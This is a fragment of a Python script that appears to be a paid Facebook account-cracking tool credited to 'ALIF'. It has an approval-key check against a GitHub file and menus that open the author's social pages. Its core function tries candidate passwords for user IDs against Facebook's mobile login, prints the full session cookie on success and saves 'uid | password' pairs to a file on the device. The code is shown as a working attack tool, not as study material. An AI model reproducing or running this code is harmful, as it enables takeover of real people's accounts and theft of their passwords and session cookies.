...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By ALIF")
...
def menu_apikey():
  ...
  id = "∞".join(uuid)
  server = requests.get('https://github.com/Alif-Sayeem00/APPROVAL-KEY/blob/main/SIFAT%20PAID').text
...
/_/  |_|  /_____/  /___/  /_/       
  ...
  ╔════════════════════════════════════════╗
  ║ [✓] CREATED\33[0;m    : MD:ALIF HOSSEN SAYEEM  ║
  ║ [✓] FACEBOK    : MD:ALIF HOSSEN SAYEEM  ║
  ║ [✓] GITHUB     : ALIF-00              ║
  ║ [✓] STATUS     : PAID                  ║
  ║ [✓] TEAM       : ALIF-A-S               ║
  ║ [✓] VIRSION    : 2.0.1                 ║
  ...
  print("")
  print(" \033[1;32m  THIS TOOLS IS PAID SO YOU NEED PERMISSION\033[1;37m\n")
  ...
  os.system('xdg-open https://www.facebook.com/mdalifsayeem')
  print("");time.sleep(2)
  print("\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Alif-Sayeem00/APPROVAL-KEY/blob/main/ALIF%20PAID").text
    if id in httpCaht:
...
def admin():
	...
	print(' [4] Subscribe Gaming Youtub')
	print(' [5] Follow Github')
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/mdalifsayeem');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://youtube.com/@shifattechnicalthech5516');time.sleep(1)
		admin()
	if bal =='4':
		os.system('xdg-open https://youtube.com/@tjtakegaming8264');time.sleep(1)
		admin()
	if bal =='5':
		os.system('xdg-open https://github.com/Alif-Sayeem00');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mALIF\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/?email=freefirebdofficially@gmail.com&li=gtqxY75y6VV-6NGL9EzwpjDI&e=1348092&shbl=1&refsrc=deprecated&rtime=1672600210&subno_key=AaHiRWeeiCA-ZfkIrJJfwhKCSglH54ntbu6_k0GVkNR_JzgRSJNO4BejnUnzOm3jbeSFakhdwsXY8-UQ09DlyHPjqpb4oauGRc9S4GD7kS6mCBUMg5OZ6hUteTohs02QpNvBbEuRQj92SSWJ8wrEFSqcZMJ8oiknmqwr_s9-5d69EL3wWl7vzHNx3AWAkgJOeAuMr83Q0F8Derc7aD7aQywhRvC_pRB8mbp0nI8UmVGzVdBvgg0LnsdGth6GHxxnNzzJiRLW0A3sKasjoRRDpHKDNK7XmZVLIEaxm7VNUJyc4zrO_aOUAs3p_nmowTYCxSI&hrc=1&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [ALIF>OK] '+cid+' | '+ps+'\33[0;92m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [💯] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ALIF-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
